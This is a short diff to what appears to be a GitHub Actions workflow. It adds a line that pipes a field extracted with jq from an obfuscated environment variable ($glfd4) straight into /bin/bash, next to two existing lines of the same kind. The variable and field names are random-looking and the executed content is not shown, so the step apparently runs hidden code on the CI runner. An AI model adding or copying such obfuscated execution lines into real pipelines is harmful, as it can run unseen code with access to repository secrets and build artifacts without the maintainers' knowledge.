@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$tgs75057" | jq -r .envd02 | /bin/bash
           echo $hjn20344 | jq -r .wu51 | /bin/bash
+          printf '%s' "$glfd4" | jq -r .nzowf1 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
